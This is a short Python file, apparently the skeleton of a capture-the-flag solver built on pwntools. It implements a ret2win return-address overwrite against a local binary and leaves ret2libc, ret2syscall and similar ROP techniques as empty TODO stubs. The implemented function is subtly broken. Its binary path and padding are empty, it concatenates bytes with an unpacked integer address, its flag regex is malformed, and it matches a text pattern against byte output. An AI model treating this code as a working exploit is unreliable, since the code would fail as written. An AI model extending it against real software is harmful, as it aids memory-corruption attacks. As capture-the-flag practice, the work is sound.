from typing import Optional
import re
from pwn import *


def ret2win(vuln) -> Optional[str]:
    bin_path = ""
    start_pay = b""
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]^{32}\})"""

    elf = ELF(bin_path)
    win_addr = elf.symbols['win']
    p = process(bin_path)
    p.sendline(start_pay + win_addr)
    out = p.recv()
    
    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2system(vuln) -> Optional[str]:
    return None # TODO


def ret2execve(vuln) -> Optional[str]:
    return None # TODO


def ret2syscall(vuln) -> Optional[str]:
    return None # TODO


def ret2libc(vuln) -> Optional[str]:
    return None # TODO


def ropwrite(vuln) -> Optional[str]:
    return None # TODO
